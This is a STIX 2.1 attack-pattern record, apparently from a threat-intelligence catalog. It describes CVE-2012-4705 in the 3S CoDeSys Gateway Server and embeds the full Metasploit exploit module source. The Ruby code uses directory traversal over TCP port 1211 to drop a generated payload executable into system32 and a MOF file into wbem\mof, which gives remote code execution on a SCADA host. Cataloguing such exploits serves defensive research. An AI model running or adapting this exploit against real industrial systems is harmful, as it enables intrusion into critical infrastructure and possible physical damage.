{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3476a2c-ca91-42c8-b266-d75f9b1e0f63",
    "created": "2024-08-14T16:39:03.10654Z",
    "modified": "2024-08-14T16:39:03.106544Z",
    "name": "SCADA 3S CoDeSys Gateway Server Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability that allows arbitrary file creation, which can be used to execute a mof file in order to gain remote execution within the SCADA system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/codesys_gateway_server_traversal.rb",
            "external_id": "codesys_gateway_server_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-4705"
        },
        {
            "source_name": "reference",
            "url": "http://ics-cert.us-cert.gov/pdf/ICSA-13-050-01-a.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n#   https://metasploit.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SCADA 3S CoDeSys Gateway Server Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability that allows arbitrary\n        file creation, which can be used to execute a mof file in order to gain remote\n        execution within the SCADA system.\n      },\n      'Author'         =>\n        [\n          'Enrique Sanchez <esanchez[at]accuvant.com>'\n        ],\n      'License'        => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => []\n      },\n      'References'     =>\n        [\n          ['CVE', '2012-4705'],\n          ['OSVDB', '90368'],\n          ['URL', 'http://ics-cert.us-cert.gov/pdf/ICSA-13-050-01-a.pdf']\n        ],\n      'DisclosureDate' => '2013-02-02',\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows Universal S3 CoDeSyS < 2.3.9.27', { }]\n        ],\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(1211),\n      ])\n  end\n\n  ##\n  # upload_file(remote_filepath, remote_filename, local_filedata)\n  #\n  # remote_filepath: Remote filepath where the file will be uploaded\n  # remote_filename: Remote name of the file to be executed ie. boot.ini\n  # local_file: File containing the read data for the local file to be uploaded, actual open/read/close done in exploit()\n  def upload_file(remote_filepath, remote_filename, local_filedata = null)\n    magic_code = \"\\xdd\\xdd\"\n    opcode = [6].pack('L')\n\n    # We create the filepath for the upload, for execution it should be \\windows\\system32\\wbem\\mof\\<file with extension mof!\n    file = \"..\\\\..\\\\\" << remote_filepath << remote_filename << \"\\x00\"\n    pkt_size = local_filedata.size() + file.size() + (0x108 - file.size()) + 4\n\n    # Magic_code  + packing + size\n    pkt = magic_code << \"AAAAAAAAAAAA\" << [pkt_size].pack('L')\n\n    tmp_pkt = opcode << file\n    tmp_pkt += \"\\x00\"*(0x108 - tmp_pkt.size) << [local_filedata.size].pack('L') << local_filedata\n    pkt << tmp_pkt\n\n    print_status(\"Starting upload of file #{remote_filename}\")\n    connect\n    sock.put(pkt)\n    disconnect\n\n    print_status(\"File uploaded\")\n  end\n\n  def exploit\n    print_status(\"Attempting to communicate with SCADA system #{rhost} on port #{rport}\")\n\n    # We create an exe payload, we have to get remote execution in 2 steps\n    exe = generate_payload_exe\n    exe_name = Rex::Text::rand_text_alpha(8) + \".exe\"\n    upload_file(\"windows\\\\system32\\\\\", exe_name, exe)\n\n    # We create the mof file and upload (second step)\n    mof_name = Rex::Text::rand_text_alpha(8) + \".mof\"\n    mof = generate_mof(mof_name, exe_name)\n    upload_file(\"WINDOWS\\\\system32\\\\wbem\\\\mof\\\\\", mof_name, mof)\n\n    print_status(\"Everything is ready, waiting for a session ... \")\n    handler\n\n    #Taken from the spooler exploit writen byt jduck and HDMoore\n    cnt = 1\n    while session_created? == false and cnt < 25\n      ::IO.select(nil, nil, nil, 0.25)\n      cnt += 1\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-02",
    "x_mitre_platforms": [
        "win'"
    ]
}